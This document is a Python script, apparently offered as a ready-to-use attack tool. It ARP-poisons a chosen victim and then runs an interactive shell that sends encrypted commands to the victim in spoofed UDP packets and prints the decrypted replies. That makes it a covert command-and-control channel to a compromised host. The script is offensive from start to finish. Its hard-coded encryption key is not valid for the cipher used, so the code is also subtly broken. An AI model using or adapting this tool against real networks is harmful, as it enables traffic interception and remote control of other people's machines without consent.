#!/usr/bin/env python3

import sys
import socket
import threading
import time
from logging import getLogger, ERROR
from cryptography.fernet import Fernet

getLogger('scapy.runtime').setLevel(ERROR)

try:
    from scapy.all import *
except ImportError:
    print('[!] Scapy Installation Not Found')
    sys.exit(1)

# Génération ou clé partagée pour le chiffrement
SECRET_KEY = b'some_shared_secret_key_32bytes'
cipher = Fernet(SECRET_KEY)

try:
    victimIP = input('[*] Enter Victim IP: ')
    spoofIP = input('[*] Enter IP to Spoof: ')
    IF = input('[*] Enter Desired Interface: ')
except KeyboardInterrupt:
    print('[!] User Interrupted Input')
    sys.exit(1)

conf.verb = 0

def getMAC():
    """Récupère l'adresse MAC de la victime."""
    try:
        pkt = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=victimIP), timeout=2, iface=IF, inter=0.1, verbose=0)
        for snd, rcv in pkt[0]:
            return rcv.sprintf(r"%Ether.src%")
    except Exception as e:
        print(f'[!] Failed to Resolve Victim MAC Address: {e}')
        sys.exit(1)

print('\n[*] Resolving Victim MAC Address...')
victimMAC = getMAC()

spoofStatus = True

def poison():
    """Effectue un empoisonnement ARP continu."""
    while spoofStatus:
        try:
            send(ARP(op=2, pdst=victimIP, psrc=spoofIP, hwdst=victimMAC), verbose=0)
            time.sleep(2)  # Optimisation: réduit l'intervalle
        except Exception as e:
            print(f'[!] Error in ARP Poisoning: {e}')

print('\n[*] Starting Spoofer Thread...')
try:
    poisonerThread = threading.Thread(target=poison, daemon=True)
    poisonerThread.start()
    print('[*] Thread Started Successfully\n')
except Exception as e:
    print(f'[!] Failed to Start Thread: {e}')
    sys.exit(1)

print('[*] Initializing Interaction With Victim...')

def send_command(command):
    """Envoie une commande chiffrée et reçoit une réponse."""
    try:
        encrypted_command = cipher.encrypt(command.encode())
        response = sr1(IP(dst=victimIP, src=spoofIP) / UDP(sport=80, dport=80) / Raw(load=encrypted_command), timeout=3, verbose=0)
        if response and response.haslayer(Raw):
            decrypted_response = cipher.decrypt(response.getlayer(Raw).load).decode()
            return decrypted_response
        else:
            return "[!] No response from victim."
    except Exception as e:
        return f"[!] Error while sending command: {e}"

# Envoi des messages initiaux
try:
    send_command("hello victim")
    prompt = send_command("report")
    print('[*] Initialization Complete')
    print('[*] Enter "goodbye" to Stop Interaction\n')
except Exception as e:
    print(f'[!] Initialization Failed: {e}')
    spoofStatus = False
    sys.exit(1)

# Interaction avec la victime
try:
    while True:
        command = input(prompt or "> ")
        if command.strip() == "goodbye":
            print('\nGrabbing Threads...')
            spoofStatus = False
            poisonerThread.join()
            print("[*] Interaction Terminated.")
            sys.exit(0)
        output = send_command(command)
        print(output)
except KeyboardInterrupt:
    print('\n[!] User Interrupted. Exiting...')
    spoofStatus = False
    poisonerThread.join()
    sys.exit(1)
except Exception as e:
    print(f'[!] Unexpected Error: {e}')
    spoofStatus = False
    poisonerThread.join()
    sys.exit(1)
